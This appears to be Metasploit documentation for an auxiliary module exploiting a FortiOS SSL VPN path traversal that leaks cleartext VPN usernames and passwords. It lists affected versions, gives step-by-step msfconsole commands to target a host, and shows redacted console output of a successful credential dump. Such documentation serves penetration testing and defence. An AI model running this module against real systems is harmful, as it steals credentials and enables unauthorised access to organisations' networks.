FortiOS system file leak through SSL VPN via specially crafted HTTP resource requests.

A path traversal vulnerability in the FortiOS SSL VPN web portal may allow an unauthenticated
attacker to download FortiOS system files through specially crafted HTTP resource requests.

## Vulnerable Application

This module reads logins and passwords in clear text from the `/dev/cmdb/sslvpn_websession` file.
This vulnerability affects (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0 to 6.0.4).

## Verification Steps

1. Start msfconsole
2. Do: use auxiliary/scanner/http/fortios_vpnssl_traversal_leak
3. Do: set RHOSTS [IP]
4. Do: set RPORT 10443
5. Do: run

## Options

### DUMP_FORMAT

Dump format. (Accepted: raw, ascii)

### STORE_CRED

Store credential into the Metasploit database.

## Scenarios

### Usages

You can scan and get all credentials on the remote target when you run the following command:

```
msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > options

Module options (auxiliary/scanner/http/fortios_vpnssl_traversal_leak):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_FORMAT  raw              yes       Dump format. (Accepted: raw, ascii)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       XXX.XX.XXX.X     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        10443            yes       The target port (TCP)
   SSL          true             no        Negotiate SSL/TLS for outgoing connections
   STORE_CRED   true             no        Store credential into the database.
   TARGETURI    /remote          yes       Base path
   THREADS      16               yes       The number of concurrent threads (max one per host)
   VHOST                         no        HTTP server virtual host

msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > run

[*] https://XXX.XX.XXX.X:10443 - Trying to connect.
[+] https://XXX.XX.XXX.X:10443 - Vulnerable!
[+] https://XXX.XX.XXX.X:10443 - File saved to /home/mekhalleh/.msf4/loot/20201216194020_default_XXX.XX.XXX.X__667507.txt
[+] https://XXX.XX.XXX.X:10443 - 1 credential(s) found!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) > creds
Credentials
===========

host          origin        service            public  private  realm  private_type  JtR Format
----          ------        -------            ------  -------  -----  ------------  ----------
XXX.XX.XXX.X  XXX.XX.XXX.X  10443/tcp (https)  redacted  redacted          Password      

msf6 auxiliary(scanner/http/fortios_vpnssl_traversal_leak) >
```
